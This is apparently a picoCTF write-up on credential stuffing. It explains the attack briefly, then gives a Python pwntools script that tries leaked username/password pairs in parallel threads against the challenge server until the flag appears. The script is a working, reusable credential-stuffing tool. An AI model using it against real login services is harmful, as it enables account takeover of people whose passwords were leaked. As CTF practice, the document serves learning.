# Credential Stuffing

Credential stuffing is the automated injection of stolen username and password pairs (“credentials”)
in to website login forms, in order to fraudulently gain access to user accounts.
Since many users will re-use the same password and username/email,
when those credentials are exposed (by a database breach or phishing attack, for example)
submitting those sets of stolen credentials into dozens or hundreds of other sites can allow an attacker to compromise those accounts too.
Download the credentials dump here.
Additional details will be available after launching your challenge instance.

---
## Script:
```
from pwn import *
import concurrent.futures
import threading
import sys

creds = []
stop_event = threading.Event()
host = 'crystal-peak.picoctf.net'
port = 63833 # Change Port

with open("creds-dump.txt","r") as file:
	for i in file:
		user,pw = i.strip().split(";")
		creds.append((user,pw))

def bruteforce(creds):
	if stop_event.is_set():
        	return
	user,pw =creds
	io = remote(host, port,level='error',timeout=5)
	io.sendlineafter(b"Username:",user.encode())
	io.sendlineafter(b"Password:",pw.encode())
	out = io.recvall()
	io.close()
	if b"picoCTF" in out:
		print(f"Username:Pass = {user}:{pw}")
		stop_event.set()

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(bruteforce, creds)
```
	
	
	

		
